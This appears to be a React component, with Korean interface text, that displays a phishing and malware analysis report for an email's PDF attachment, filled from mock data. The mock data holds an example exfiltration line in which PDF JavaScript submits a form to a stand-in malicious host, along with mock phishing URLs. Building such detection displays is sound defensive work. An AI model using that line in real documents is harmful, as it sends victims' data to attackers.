import React from 'react';
import {
  Box,
  Card,
  CardContent,
  Typography,
  Grid,
  Chip,
  Button,
  TextField,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
  FormControlLabel,
  Switch,
  Paper,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Alert,
  IconButton,
  Tooltip,
  Accordion,
  AccordionSummary,
  AccordionDetails,
} from '@mui/material';
import {
  InfoOutlined as InfoIcon,
  DeleteOutline as DeleteIcon,
  Download as DownloadIcon,
  Warning as WarningIcon,
  ExpandMore as ExpandMoreIcon,
  Security as SecurityIcon,
  Refresh as RefreshIcon,
} from '@mui/icons-material';
import { useParams } from 'react-router-dom';

const mockResult = {
  id: '1',
  fileName: 'invoice_document.pdf',
  fileSize: '2.5MB',
  subject: '[중요] 2024년 3월 청구서 발송',
  fileHash: {
    md5: 'd41d8cd98f00b204e9800998ecf8427e',
    sha1: 'da39a3ee5e6b4b0d3255bfef95601890afd80709',
    sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
  },
  sender: 'sender@example.com',
  recipient: 'recipient@company.com',
  securityLevel: 'dangerous',
  securityReason: '피싱 사이트로 연결되는 링크 존재, PDF 내부에 악성 코드 포함',
  receivedAt: new Date('2024-03-01T10:30:00'),
  virusTotalResults: {
    positives: 5,
    total: 70,
    scanDate: new Date(),
    detections: [
      { engine: 'Engine1', result: 'Trojan.PDF.Phishing' },
      { engine: 'Engine2', result: 'Malicious.PDF.Dropper' },
      { engine: 'Engine3', result: 'Clean' }
    ]
  },
  suspiciousElements: {
    pdfbox_analysis: {
      embedded_scripts: true,
      action_details: "this.submitForm('http://malicious-site.com/steal-data')",
      suspicious_elements: [
        {
          element: "JavaScript",
          description: "PDF 내부에 포함된 JavaScript 코드가 악성 사이트로 데이터를 전송하는 폼을 자동으로 제출함."
        },
        {
          element: "Shellcode",
          description: "쉘코드를 버퍼에 삽입하여 취약점을 이용하려는 코드가 포함됨."
        }
      ]
    },
    urlAnalysis: {
      internalLinks: [
        {
          url: 'https://malicious-site.com/login',
          structure: {
            domain: 'malicious-site.com',
            path: '/login',
            queryParams: {
              redirect: 'https://legitimate-bank.com'
            }
          },
          redirects: [
            {
              type: 'javascript',
              destination: 'https://phishing-site.com'
            }
          ],
          isPhishingUrl: true,
          whoisInfo: {
            creationDate: '2024-02-15',
            isNewDomain: true,
            dnsInfo: {
              ip: '192.168.1.1',
              nameservers: ['ns1.suspicious.com']
            },
            isBlacklisted: true
          }
        }
      ]
    }
  }
};

export const AnalysisDetail = () => {
  const { id } = useParams();
  const [feedbackOpen, setFeedbackOpen] = React.useState(false);
  const [deleteConfirmOpen, setDeleteConfirmOpen] = React.useState(false);
  const [reportOpen, setReportOpen] = React.useState(false);
  const [rescanOpen, setRescanOpen] = React.useState(false);
  const [feedback, setFeedback] = React.useState({
    isPhishing: false,
    comment: '',
  });

  const handleFeedbackSubmit = () => {
    // TODO: API 호출로 피드백 제출
    setFeedbackOpen(false);
  };

  const handleDelete = () => {
    // TODO: API 호출로 파일 삭제
    setDeleteConfirmOpen(false);
  };

  const handleDownload = () => {
    // TODO: API 호출로 파일 다운로드
  };

  const handleRescan = () => {
    // TODO: API 호출로 추가 검사 실행
    setRescanOpen(false);
  };

  const handleReport = () => {
    // TODO: API 호출로 신고 제출
    setReportOpen(false);
  };

  return (
    <Box>
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 3 }}>
        <Typography variant="h4">
          보안 분석 결과
        </Typography>
        <Box sx={{ display: 'flex', gap: 1 }}>
          <Tooltip title="추가 검사">
            <IconButton onClick={() => setRescanOpen(true)} color="primary">
              <RefreshIcon />
            </IconButton>
          </Tooltip>
          <Tooltip title="파일 신고">
            <IconButton onClick={() => setReportOpen(true)} color="warning">
              <WarningIcon />
            </IconButton>
          </Tooltip>
          <Tooltip title="파일 다운로드">
            <IconButton onClick={handleDownload} color="primary">
              <DownloadIcon />
            </IconButton>
          </Tooltip>
          <Tooltip title="파일 삭제">
            <IconButton onClick={() => setDeleteConfirmOpen(true)} color="error">
              <DeleteIcon />
            </IconButton>
          </Tooltip>
        </Box>
      </Box>

      {mockResult.securityLevel === 'dangerous' && (
        <Alert icon={<WarningIcon />} sx={{ mb: 3 }} severity="error">
          이 PDF 파일에서 위험한 요소가 탐지되었습니다. 파일을 열거나 실행하지 마십시오.
      </Alert>
      )}

      <Grid container spacing={3}>
        {/* 기본 정보 카드 */}
        <Grid item xs={12}>
          <Card>
            <CardContent>
            <Typography variant="h6" gutterBottom> 이메일 정보 </Typography>
              <TableContainer component={Paper} elevation={0}>
                <Table>
                  <TableBody>
                    <TableRow>
                      <TableCell component="th">메일 제목</TableCell>
                      <TableCell>{mockResult.subject}</TableCell>
                    </TableRow>
                    <TableRow>
                      <TableCell component="th">발신자</TableCell>
                      <TableCell>{mockResult.sender}</TableCell>
                    </TableRow>
                    <TableRow>
                      <TableCell component="th">수신자</TableCell>
                      <TableCell>{mockResult.recipient}</TableCell>
                    </TableRow>
                    <TableRow>
                      <TableCell component="th">수신 날짜</TableCell>
                      <TableCell>{mockResult.receivedAt.toLocaleString()}</TableCell>
                    </TableRow>
                  </TableBody>
                </Table>
              </TableContainer>
            </CardContent>
          </Card>
          <Card>
            <CardContent>
              <Typography variant="h6" gutterBottom> 파일 정보 </Typography>
              <TableContainer component={Paper} elevation={0}>
                <Table>
                  <TableBody>
                    <TableRow>
                      <TableCell component="th" sx={{ width: '30%' }}>파일명</TableCell>
                      <TableCell>{mockResult.fileName}</TableCell>
                    </TableRow>
                    <TableRow>
                      <TableCell component="th">파일 크기</TableCell>
                      <TableCell>{mockResult.fileSize}</TableCell>
                    </TableRow>
                    <TableRow>
                      <TableCell component="th">해시값</TableCell>
                      <TableCell>
                        <Typography variant="body2">MD5: {mockResult.fileHash.md5}</Typography>
                        <Typography variant="body2">SHA-1: {mockResult.fileHash.sha1}</Typography>
                        <Typography variant="body2">SHA-256: {mockResult.fileHash.sha256}</Typography>
                      </TableCell>
                    </TableRow>
                    <TableRow>
                      <TableCell component="th">분석 결과</TableCell>
                      <TableCell>
                        <Chip
                          label={mockResult.securityLevel === 'dangerous' ? '위험' : 
                                 mockResult.securityLevel === 'suspicious' ? '의심' : '안전'}
                          color={
                            mockResult.securityLevel === 'dangerous'
                              ? 'error'
                              : mockResult.securityLevel === 'suspicious'
                              ? 'warning'
                              : 'success'
                          }
                          size="small"
                        />
                        <Typography variant="body2" sx={{ mt: 1 }}>
                          {mockResult.securityReason}
                        </Typography>
                      </TableCell>
                    </TableRow>
                  </TableBody>
                </Table>
              </TableContainer>
            </CardContent>
          </Card>
        </Grid>

        {/* VirusTotal 분석 결과 */}
        <Grid item xs={12}>
          <Accordion defaultExpanded>
            <AccordionSummary
              expandIcon={<ExpandMoreIcon />}
              sx={{ bgcolor: 'primary.light', color: 'white' }}
            >
              <Box sx={{ display: 'flex', alignItems: 'center' }}>
                <SecurityIcon sx={{ mr: 1 }} />
                <Typography variant="h6">VirusTotal 분석 결과</Typography>
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Box sx={{ mb: 3 }}>
                <Typography variant="h4" gutterBottom align="center">
                  {mockResult.virusTotalResults.positives} / {mockResult.virusTotalResults.total}
                </Typography>
                <Typography variant="body2" color="text.secondary" align="center">
                  악성으로 탐지한 엔진 수 / 전체 엔진 수
                        </Typography>
                <Typography variant="body2" color="text.secondary" align="center">
                  분석 날짜: {mockResult.virusTotalResults.scanDate.toLocaleString()}
                        </Typography>
                        </Box>
              <TableContainer component={Paper} elevation={0}>
                <Table>
                  <TableHead>
                    <TableRow>
                      <TableCell>보안 엔진</TableCell>
                      <TableCell>탐지 결과</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {mockResult.virusTotalResults.detections.map((detection, index) => (
                      <TableRow key={index}>
                        <TableCell>{detection.engine}</TableCell>
                        <TableCell>{detection.result}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </AccordionDetails>
          </Accordion>
        </Grid>

        {/* 의심 요소 분석 */}
        <Grid item xs={12}>
          <Accordion defaultExpanded>
            <AccordionSummary
              expandIcon={<ExpandMoreIcon />}
              sx={{ bgcolor: 'error.light', color: 'white' }}
            >
              <Box sx={{ display: 'flex', alignItems: 'center' }}>
                <WarningIcon sx={{ mr: 1 }} />
                <Typography variant="h6">의심 요소 분석</Typography>
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Grid container spacing={2}>
                {/* Apache PDFBox 분석 */}
                <Grid item xs={12}>
                  <Paper elevation={0} sx={{ p: 3, bgcolor: '#f5f5f5' }}>
                    <Typography variant="h6" sx={{ 
                      mb: 3, 
                      color: 'text.primary', 
                      letterSpacing: 0.5,
                      display: 'flex',
                      alignItems: 'center'
                    }}>
                      Apache PDFBox 분석 결과
                    </Typography>

                    {/* 스크립트 실행 코드 */}
                    <Box sx={{ mb: 3 }}>
                      <Typography variant="subtitle1" sx={{ 
                        color: 'text.primary',
                        fontWeight: 600,
                        mb: 2
                      }}>
                        실행 코드 분석
                      </Typography>
                      <Paper sx={{ 
                        p: 2, 
                        bgcolor: '#272c34', 
                        color: '#fff', 
                        fontFamily: 'monospace',
                        mb: 2
                      }}>
                        <code>{mockResult.suspiciousElements.pdfbox_analysis.action_details}</code>
                      </Paper>
                    </Box>

                    {/* 의심스러운 요소 목록 */}
                    <Box>
                      <Typography variant="subtitle1" sx={{ 
                        color: 'text.primary',
                        fontWeight: 600,
                        mb: 2
                      }}>
                        발견된 의심 요소
                      </Typography>
                      <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
                        {mockResult.suspiciousElements.pdfbox_analysis.suspicious_elements.map((element, index) => (
                          <Alert 
                            key={index} 
                            severity="error"
                            sx={{
                              '& .MuiAlert-message': {
                                width: '100%'
                              }
                            }}
                          >
                            <Box sx={{ 
                              display: 'flex', 
                              alignItems: 'center', 
                              justifyContent: 'space-between',
                              mb: 0.5 
                            }}>
                              <Typography variant="subtitle2" sx={{ fontWeight: 600 }}>
                                {element.element}
                              </Typography>
                            </Box>
                            <Typography variant="body2" color="text.secondary">
                              {element.description}
                            </Typography>
                          </Alert>
                        ))}
                      </Box>
                    </Box>
                  </Paper>
                </Grid>

                {/* 내부 링크 검사 */}
                <Grid item xs={12}>
                  <Paper elevation={0} sx={{ p: 3, bgcolor: '#f5f5f5' }}>
                    <Typography variant="h6" sx={{ mb: 3, color: 'text.primary', letterSpacing: 0.5 }}>
                      내부 링크 검사
                    </Typography>
                    {mockResult.suspiciousElements.urlAnalysis.internalLinks.map((link, index) => (
                      <Box key={index} sx={{ 
                        mb: 4,
                        pb: 3,
                        borderBottom: index !== mockResult.suspiciousElements.urlAnalysis.internalLinks.length - 1 ? '1px solid rgba(0, 0, 0, 0.12)' : 'none'
                      }}>
                        <Box sx={{ 
                          p: 2, 
                          mb: 3, 
                          bgcolor: 'background.paper',
                          borderRadius: 1,
                          border: '1px solid rgba(0, 0, 0, 0.12)'
                        }}>
                          <Typography variant="subtitle2" color="text.secondary" gutterBottom sx={{ letterSpacing: 0.5 }}>
                            검사 대상 URL
                          </Typography>
                          <Typography variant="body1" sx={{ color: 'primary.main', wordBreak: 'break-all' }}>
                            {link.url}
                        </Typography>
                      </Box>

                        {/* URL 구조 분석 */}
                        <Box sx={{ mb: 3 }}>
                          <Typography> URL 구조 </Typography>
                          <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap', mt: 2, ml: 4 }}>
                            <Chip
                              label={`도메인: ${link.structure.domain}`}
                              size="small"
                              color="primary"
                              variant="outlined"
                              sx={{ borderRadius: 1 }}
                            />
                            <Chip
                              label={`경로: ${link.structure.path}`}
                              size="small"
                              color="primary"
                              variant="outlined"
                              sx={{ borderRadius: 1 }}
                            />
                            {Object.entries(link.structure.queryParams || {}).map(([key, value]) => (
                              <Chip
                                key={key}
                                label={`${key}: ${value}`}
                                size="small"
                                color="primary"
                                variant="outlined"
                                sx={{ borderRadius: 1 }}
                              />
                            ))}
                          </Box>
                        </Box>

                        {/* 리다이렉트 검사 */}
                        <Box sx={{ mb: 3 }}>
                        <Typography> 리다이렉트 검사 </Typography>
                          <Box sx={{ ml: 4, mt: 2 }}>
                            {link.redirects.map((redirect, i) => (
                              <Box key={i} sx={{ 
                                display: 'flex', 
                                alignItems: 'center', 
                                mb: 1,
                                p: 1.5,
                                bgcolor: 'background.paper',
                                borderRadius: 1,
                                border: '1px solid rgba(0, 0, 0, 0.12)'
                              }}>
                                <Typography variant="body2" sx={{ mr: 1, color: 'text.secondary' }}>
                                  {redirect.type} 리다이렉트
                                </Typography>
                                <Typography variant="body2" sx={{ mx: 1, color: 'error.main' }}>
                                  →
                                </Typography>
                                <Typography variant="body2" sx={{ color: 'error.main', fontWeight: 500 }}>
                                  {redirect.destination}
                                </Typography>
                              </Box>
                            ))}
                          </Box>
                        </Box>

                        {/* 피싱 URL 데이터베이스 대조 */}
                        <Box sx={{ mb: 3 }}>
                          <Typography> 피싱 URL 데이터베이스 대조 </Typography>
                          <Box sx={{ ml: 4, mt: 2 }}>
                            <Alert 
                              severity={link.isPhishingUrl ? "error" : "success"}
                              sx={{ 
                                '& .MuiAlert-message': { 
                                  fontSize: '0.9rem',
                                  letterSpacing: 0.3
                                }
                              }}
                            >
                              {link.isPhishingUrl ? 
                                "이 URL은 피싱 사이트 데이터베이스에 등록되어 있습니다." : 
                                "피싱 사이트 데이터베이스에서 발견되지 않았습니다."}
                            </Alert>
                          </Box>
                        </Box>

                        {/* WHOIS 도메인 평판 조회 */}
                        <Box>
                        <Typography> WHOIS 도메인 평판 조회 </Typography>
                          <Box sx={{ ml: 4, mt: 2 }}>
                            <Paper sx={{ p: 2, bgcolor: 'background.paper' }}>
                              <Grid container spacing={2}>
                                <Grid item xs={12}>
                                  <Typography variant="body2" sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                                    <span style={{ color: 'rgba(0, 0, 0, 0.6)' }}>도메인 생성일:</span>
                                    <span style={{ fontWeight: 500 }}>{link.whoisInfo.creationDate}</span>
                                    {link.whoisInfo.isNewDomain && (
                                      <Chip
                                        label="최근 생성된 도메인"
                                        size="small"
                                        color="warning"
                                        sx={{ ml: 1 }}
                                      />
                                    )}
                                  </Typography>
                                </Grid>
                                <Grid item xs={12}>
                                  <Typography variant="body2" sx={{ color: 'rgba(0, 0, 0, 0.6)', mb: 1 }}>
                                    DNS 정보:
                                  </Typography>
                                  <Box sx={{ pl: 2 }}>
                                    <Typography variant="body2" sx={{ mb: 0.5 }}>
                                      <span style={{ color: 'rgba(0, 0, 0, 0.6)' }}>IP:</span>
                                      <span style={{ fontWeight: 500, marginLeft: '8px' }}>{link.whoisInfo.dnsInfo.ip}</span>
                                    </Typography>
                                    <Typography variant="body2">
                                      <span style={{ color: 'rgba(0, 0, 0, 0.6)' }}>네임서버:</span>
                                      <span style={{ fontWeight: 500, marginLeft: '8px' }}>{link.whoisInfo.dnsInfo.nameservers.join(', ')}</span>
                                    </Typography>
                                  </Box>
                                </Grid>
                                {link.whoisInfo.isBlacklisted && (
                                  <Grid item xs={12}>
                                    <Alert 
                                      severity="error" 
                                      sx={{ 
                                        mt: 1,
                                        '& .MuiAlert-message': { 
                                          fontSize: '0.9rem',
                                          letterSpacing: 0.3
                                        }
                                      }}
                                    >
                                      이 도메인은 블랙리스트에 등록되어 있습니다.
                                    </Alert>
                                  </Grid>
                                )}
                              </Grid>
                            </Paper>
                          </Box>
                        </Box>
                      </Box>
                    ))}
                    </Paper>
                  </Grid>
              </Grid>
            </AccordionDetails>
          </Accordion>
        </Grid>

        {/* 피드백 버튼 */}
        <Grid item xs={12}>
          <Box sx={{ display: 'flex', justifyContent: 'center', mt: 2 }}>
            <Button
              variant="contained"
              color="primary"
              onClick={() => setFeedbackOpen(true)}
              startIcon={<InfoIcon />}
            >
              피드백 제공하기
            </Button>
          </Box>
        </Grid>
      </Grid>

      {/* 피드백 다이얼로그 */}
      <Dialog open={feedbackOpen} onClose={() => setFeedbackOpen(false)}>
        <DialogTitle>피드백 제공</DialogTitle>
        <DialogContent>
          <Box>
            <FormControlLabel
             label="이 파일이 피싱/악성 파일이라고 생각하십니까?"
              control={
                <Switch
                  checked={feedback.isPhishing}
                  onChange={(e) =>
                    setFeedback({ ...feedback, isPhishing: e.target.checked })
                  }
                />
              }
            />
            <TextField
              fullWidth
              multiline
              rows={4}
              margin="normal"
              label="추가 의견"
              value={feedback.comment}
              onChange={(e) =>
                setFeedback({ ...feedback, comment: e.target.value })
              }
            />
          </Box>
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setFeedbackOpen(false)}>취소</Button>
          <Button onClick={handleFeedbackSubmit} variant="contained">
            제출
          </Button>
        </DialogActions>
      </Dialog>

      {/* 삭제 확인 다이얼로그 */}
      <Dialog open={deleteConfirmOpen} onClose={() => setDeleteConfirmOpen(false)}>
        <DialogTitle>파일 삭제 확인</DialogTitle>
        <DialogContent>
          <Typography>
            이 파일을 정말 삭제하시겠습니까? 이 작업은 되돌릴 수 없습니다.
          </Typography>
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setDeleteConfirmOpen(false)}>취소</Button>
          <Button onClick={handleDelete} color="error" variant="contained">
            삭제
          </Button>
        </DialogActions>
      </Dialog>

      {/* 추가 검사 다이얼로그 */}
      <Dialog open={rescanOpen} onClose={() => setRescanOpen(false)}>
        <DialogTitle>추가 검사 실행</DialogTitle>
        <DialogContent>
          <Typography sx={{ mt: 2 }}>
            이 파일에 대해 추가 검사를 실행하시겠습니까? <br/>
            검사는 몇 분 정도 소요될 수 있습니다.
          </Typography>
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setRescanOpen(false)}>취소</Button>
          <Button onClick={handleRescan} variant="contained" color="primary">
            검사 시작
          </Button>
        </DialogActions>
      </Dialog>

      {/* 신고 다이얼로그 */}
      <Dialog open={reportOpen} onClose={() => setReportOpen(false)}>
        <DialogTitle>파일 신고</DialogTitle>
        <DialogContent>
          <Typography sx={{ mt: 2 }}>
           이 파일을 신고하시겠습니까? 이 작업은 되돌릴 수 없습니다. <br/>
           [신고 사유] {mockResult.securityReason}
          </Typography>
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setReportOpen(false)}>취소</Button>
          <Button onClick={handleReport} variant="contained" color="warning">
            신고하기
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
}; 